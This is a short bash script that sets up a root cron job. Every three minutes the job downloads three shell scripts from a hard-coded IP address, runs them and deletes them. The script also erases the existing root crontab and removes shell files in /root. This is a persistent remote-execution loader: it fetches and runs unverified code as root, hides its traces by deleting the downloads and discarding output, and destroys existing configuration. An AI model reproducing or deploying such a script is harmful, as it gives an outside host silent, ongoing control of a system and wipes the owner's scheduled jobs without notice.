#!/bin/bash
mkdir /usr/local/sbin/jho
chmod +x /usr/local/sbin/jho
cat << EOF > /usr/local/sbin/jho/cron.sh
#!/bin/bash
wget -O /usr/local/sbin/jho/active.sh http://107.152.37.78/grd/app/prem
wget -O /usr/local/sbin/jho/inactive.sh http://107.152.37.78/grd/app/xprem
wget -O /usr/local/sbin/jho/deleted.sh http://107.152.37.78/grd/app/deleted
chmod -R +x /usr/local/sbin/jho/
cd /root
rm -rf *sh
/bin/bash /usr/local/sbin/jho/active.sh
/bin/bash /usr/local/sbin/jho/inactive.sh
/bin/bash /usr/local/sbin/jho/deleted.sh
rm /usr/local/sbin/jho/inactive.sh
rm /usr/local/sbin/jho/active.sh
rm /usr/local/sbin/jho/deleted.sh
EOF
chmod +x /usr/local/sbin/jho/cron.sh
crontab -r
echo "SHELL=/bin/bash
*/3 * * * * /bin/bash /usr/local/sbin/jho/cron.sh >/dev/null 2>&1" | crontab -
service cron restart
